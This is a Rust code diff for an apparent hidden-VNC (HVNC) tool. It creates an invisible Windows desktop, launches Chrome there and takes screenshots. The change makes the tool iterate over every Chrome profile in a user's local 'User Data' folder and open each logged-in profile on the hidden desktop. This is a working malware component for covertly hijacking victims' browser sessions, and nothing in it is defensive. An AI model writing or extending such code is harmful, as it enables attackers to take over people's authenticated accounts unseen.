@@ -14,7 +14,7 @@ use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Pr
 use std::sync::atomic::{AtomicU32, Ordering, AtomicBool};
 use chrono::Local;
 use std::path::Path;
-use std::fs::create_dir_all;
+use std::fs::{self, create_dir_all};
 use image;
 use image::GenericImageView;
 use std::sync::mpsc;
@@ -63,7 +63,7 @@ unsafe fn create_hidden_desktop(desktop_name: &str) -> Result<HDESK> {
 }
 
 // Launch Chrome in the specified desktop
-unsafe fn launch_chrome_on_desktop(desktop_name: &str, chrome_path: &str) -> Result<PROCESS_INFORMATION> {
+unsafe fn launch_chrome_on_desktop(desktop_name: &str, chrome_path: &str, user_data_dir: &str, profile_directory_name: &str) -> Result<PROCESS_INFORMATION> {
     let mut sa = SECURITY_ATTRIBUTES {
         nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
         lpSecurityDescriptor: ptr::null_mut(),
@@ -75,8 +75,8 @@ unsafe fn launch_chrome_on_desktop(desktop_name: &str, chrome_path: &str) -> Res
     let desktop_cstring = CString::new(desktop_path)?;
     si.lpDesktop = PSTR(desktop_cstring.as_ptr() as *mut u8);
     let mut command = format!(
-        "\"{}\" --disable-gpu --disable-software-rasterizer --new-window https://example.com",
-        chrome_path
+        "\"{}\" --user-data-dir=\"{}\" --profile-directory=\"{}\" --disable-gpu --disable-software-rasterizer --new-window https://example.com",
+        chrome_path, user_data_dir, profile_directory_name
     );
     let mut pi = PROCESS_INFORMATION::default();
     let result = CreateProcessA(
@@ -335,98 +335,156 @@ fn main() -> Result<()> {
     }
     let desktop_name = "ChromeHVNC";
     let chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"; // Change if needed
+    let chrome_user_data_path = r"C:\Users\eduar\AppData\Local\Google\Chrome\User Data"; 
+    // let chrome_profile_name = "Default"; // Or "Profile 1", "Profile 2", etc. We will loop now.
+
     println!("[+] Creating hidden desktop...");
     let hidden_desktop = unsafe { create_hidden_desktop(desktop_name)? };
     println!("[+] Hidden desktop created.");
-    println!("[+] Launching Chrome in hidden desktop...");
-    let _chrome_proc = unsafe { launch_chrome_on_desktop(desktop_name, chrome_path)? };
-    println!("[+] Chrome launched. Waiting for it to initialize...");
-    std::thread::sleep(std::time::Duration::from_secs(10)); // Wait longer for Chrome to fully start
-    println!("[+] Searching for Chrome processes...");
-    let chrome_pids = find_all_chrome_process_ids();
-    if chrome_pids.is_empty() {
-        return Err(anyhow!("Could not find any Chrome process"));
-    }
-    println!("[+] Found Chrome PIDs: {:?}", chrome_pids);
 
-    // Channel to get result from the capture thread
-    let (tx, rx) = mpsc::channel();
-    let desktop_handle = hidden_desktop;
-    let chrome_pids_clone = chrome_pids.clone();
-    let screenshots_dir = screenshots_dir.to_path_buf();
-    std::thread::spawn(move || {
-        // Switch this thread to the hidden desktop
-        unsafe {
-            if SetThreadDesktop(desktop_handle).is_err() {
-                let _ = tx.send(Err(anyhow!("Failed to set thread desktop in capture thread")));
-                return;
-            }
-            // Run a short message loop to allow Chrome to paint, but do not block
-            let mut msg = MSG::default();
-            let start = std::time::Instant::now();
-            while start.elapsed().as_secs() < 3 {
-                while PeekMessageW(&mut msg, HWND(0), 0, 0, PM_REMOVE).as_bool() {
-                    TranslateMessage(&msg);
-                    DispatchMessageW(&msg);
-                }
-                std::thread::sleep(std::time::Duration::from_millis(10));
-            }
-        }
-        let mut any_valid_screenshot = false;
-        for pid in chrome_pids_clone {
-            println!("[+] [HVNC thread] Attempting to capture Chrome window for PID {}...", pid);
-            CHROME_PROCESS_ID.store(pid, Ordering::Relaxed);
-            unsafe {
-                let enum_result = EnumWindows(Some(enum_windows_proc), LPARAM(0));
-                if enum_result.is_err() {
-                    println!("[-] [HVNC thread] EnumWindows failed for PID {}", pid);
-                    continue;
-                }
-            }
-            if SCREENSHOT_SAVED.load(Ordering::Relaxed) {
-                // Find the most recent screenshot file
-                let mut latest: Option<std::path::PathBuf> = None;
-                if let Ok(entries) = std::fs::read_dir(&screenshots_dir) {
-                    for entry in entries.flatten() {
-                        let path = entry.path();
-                        if path.extension().map(|e| e == "png").unwrap_or(false) {
-                            if let Some(ref l) = latest {
-                                if let (Ok(meta1), Ok(meta2)) = (std::fs::metadata(&path), std::fs::metadata(l)) {
-                                    if meta1.modified().unwrap_or(std::time::SystemTime::UNIX_EPOCH) > meta2.modified().unwrap_or(std::time::SystemTime::UNIX_EPOCH) {
-                                        latest = Some(path);
+    let profile_base_path = Path::new(chrome_user_data_path);
+    let mut overall_success = false;
+
+    match fs::read_dir(profile_base_path) {
+        Ok(entries) => {
+            for entry in entries {
+                if let Ok(entry) = entry {
+                    let path = entry.path();
+                    if path.is_dir() {
+                        if let Some(profile_name_osstr) = path.file_name() {
+                            if let Some(profile_name) = profile_name_osstr.to_str() {
+                                if profile_name == "Default" || profile_name.starts_with("Profile") {
+                                    println!("\n[+] Attempting to launch Chrome with profile: {}", profile_name);
+
+                                    println!("[+] Launching Chrome in hidden desktop for profile: {}...", profile_name);
+                                    let chrome_proc_info = match unsafe { launch_chrome_on_desktop(desktop_name, chrome_path, chrome_user_data_path, profile_name) } {
+                                        Ok(pi) => pi,
+                                        Err(e) => {
+                                            println!("[-] Failed to launch Chrome for profile {}: {:?}", profile_name, e);
+                                            continue; // Try next profile
+                                        }
+                                    };
+
+                                    println!("[+] Chrome launched for profile {}. Waiting for it to initialize...", profile_name);
+                                    std::thread::sleep(std::time::Duration::from_secs(10)); 
+
+                                    println!("[+] Searching for Chrome processes for profile {}...", profile_name);
+                                    let chrome_pids = find_all_chrome_process_ids();
+                                    if chrome_pids.is_empty() {
+                                        println!("[-] Could not find any Chrome process for profile {}.", profile_name);
+                                        // Terminate the launched Chrome process if it's still running without a window
+                                        unsafe { TerminateProcess(chrome_proc_info.hProcess, 1); CloseHandle(chrome_proc_info.hProcess); CloseHandle(chrome_proc_info.hThread); }
+                                        continue; // Try next profile
                                     }
+                                    println!("[+] Found Chrome PIDs for profile {}: {:?}", profile_name, chrome_pids);
+
+                                    let (tx, rx) = mpsc::channel();
+                                    let desktop_handle_clone = hidden_desktop; // Clone or copy if HDESK is Copy
+                                    let chrome_pids_clone = chrome_pids.clone();
+                                    let screenshots_dir_clone = screenshots_dir.to_path_buf();
+                                    
+                                    SCREENSHOT_SAVED.store(false, Ordering::Relaxed); // Reset for each profile
+
+                                    std::thread::spawn(move || {
+                                        unsafe {
+                                            if SetThreadDesktop(desktop_handle_clone).is_err() {
+                                                let _ = tx.send(Err(anyhow!("Failed to set thread desktop in capture thread for profile")));
+                                                return;
+                                            }
+                                            let mut msg = MSG::default();
+                                            let start = std::time::Instant::now();
+                                            while start.elapsed().as_secs() < 3 {
+                                                while PeekMessageW(&mut msg, HWND(0), 0, 0, PM_REMOVE).as_bool() {
+                                                    TranslateMessage(&msg);
+                                                    DispatchMessageW(&msg);
+                                                }
+                                                std::thread::sleep(std::time::Duration::from_millis(10));
+                                            }
+                                        }
+                                        let mut any_valid_screenshot_for_profile = false;
+                                        for pid in chrome_pids_clone {
+                                            println!("[+] [HVNC thread] Attempting to capture Chrome window for PID {} (Profile)...", pid);
+                                            CHROME_PROCESS_ID.store(pid, Ordering::Relaxed);
+                                            unsafe {
+                                                let enum_result = EnumWindows(Some(enum_windows_proc), LPARAM(0));
+                                                if enum_result.is_err() {
+                                                    println!("[-] [HVNC thread] EnumWindows failed for PID {} (Profile)", pid);
+                                                    continue;
+                                                }
+                                            }
+                                            if SCREENSHOT_SAVED.load(Ordering::Relaxed) {
+                                                let mut latest: Option<std::path::PathBuf> = None;
+                                                if let Ok(entries) = std::fs::read_dir(&screenshots_dir_clone) {
+                                                    for entry in entries.flatten() {
+                                                        let path = entry.path();
+                                                        if path.extension().map(|e| e == "png").unwrap_or(false) {
+                                                            if let Ok(metadata) = path.metadata() {
+                                                                if let Ok(time) = metadata.modified() {
+                                                                    if latest.as_ref().map_or(true, |l_path| {
+                                                                        l_path.metadata().ok().and_then(|l_meta| l_meta.modified().ok()).map_or(false, |l_time| time > l_time)
+                                                                    }) {
+                                                                        latest = Some(path);
+                                                                    }
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                                if let Some(ref img_path) = latest {
+                                                    if is_image_blank(img_path) {
+                                                        println!("[-] [HVNC thread] Screenshot at {:?} for profile is blank.", img_path);
+                                                    } else {
+                                                        println!("[+] [HVNC thread] Screenshot at {:?} is a valid Chrome window for profile!", img_path);
+                                                        any_valid_screenshot_for_profile = true;
+                                                        // If one valid screenshot is found for this profile, we can break from PID loop for this profile.
+                                                        // break; 
+                                                    }
+                                                }
+                                                SCREENSHOT_SAVED.store(false, Ordering::Relaxed); // Reset for next PID or next screenshot attempt
+                                            }
+                                        }
+                                        if any_valid_screenshot_for_profile {
+                                            let _ = tx.send(Ok(()));
+                                        } else {
+                                            let _ = tx.send(Err(anyhow!("No valid screenshot for this profile.")));
+                                        }
+                                    });
+
+                                    match rx.recv() {
+                                        Ok(Ok(())) => {
+                                            println!("[+] Successfully captured screenshot for profile: {}", profile_name);
+                                            overall_success = true;
+                                            // Optional: break here if you only need one profile to work
+                                            // break;
+                                        },
+                                        Ok(Err(e)) => {
+                                            println!("[-] Failed to capture for profile {}: {}", profile_name, e);
+                                        },
+                                        Err(e) => {
+                                            println!("[-] Failed to receive from capture thread for profile {}: {}", profile_name, e);
+                                        }
+                                    }
+                                    // Clean up the launched Chrome process for the current profile
+                                    println!("[+] Closing Chrome process for profile: {}", profile_name);
+                                    unsafe { TerminateProcess(chrome_proc_info.hProcess, 1); CloseHandle(chrome_proc_info.hProcess); CloseHandle(chrome_proc_info.hThread); }
+                                    println!("[+] Chrome process for profile {} closed.", profile_name);
+                                    
                                 }
-                            } else {
-                                latest = Some(path);
                             }
                         }
                     }
                 }
-                if let Some(ref img_path) = latest {
-                    if is_image_blank(img_path) {
-                        println!("[-] [HVNC thread] Screenshot at {:?} is blank (all pixels the same).", img_path);
-                    } else {
-                        println!("[+] [HVNC thread] Screenshot at {:?} is a valid Chrome window!", img_path);
-                        any_valid_screenshot = true;
-                    }
-                }
-                // Reset for next PID in case of multiple
-                SCREENSHOT_SAVED.store(false, Ordering::Relaxed);
             }
-        }
-        if any_valid_screenshot {
-            let _ = tx.send(Ok(()));
-        } else {
-            let _ = tx.send(Err(anyhow!("No valid Chrome window screenshot was saved. Make sure Chrome is visible in the hidden desktop and try again.")));
-        }
-    });
-    // Wait for the result from the capture thread
-    match rx.recv() {
-        Ok(Ok(())) => {
-            println!("[+] Done. Check the screenshots folder for valid Chrome window images.");
-            Ok(())
         },
-        Ok(Err(e)) => Err(e),
-        Err(e) => Err(anyhow!("Failed to receive from capture thread: {}", e)),
+        Err(e) => {
+            return Err(anyhow!("Failed to read Chrome user data directory at {}: {:?}", chrome_user_data_path, e));
+        }
+    }
+
+    if overall_success {
+        println!("\n[+] Done. At least one profile yielded a valid screenshot. Check the screenshots folder.");
+        Ok(())
+    } else {
+        Err(anyhow!("No valid Chrome window screenshot was saved across all attempted profiles."))
     }
 }
